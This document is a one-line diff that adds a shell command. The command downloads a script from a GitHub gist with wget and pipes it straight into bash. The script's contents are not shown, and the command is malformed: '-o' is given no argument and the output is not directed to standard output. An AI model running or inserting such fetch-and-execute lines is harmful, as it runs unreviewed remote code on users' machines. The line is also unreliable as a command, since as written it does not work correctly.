@@ -1,0 +1,1 @@
+wget https://gist.githubusercontent.com/botsarefuture/29758a2b5caa5004b778d8350b612d76/raw/808b3c3b69dadab929f419389e6161c5d2511534/script.sh -o | bash
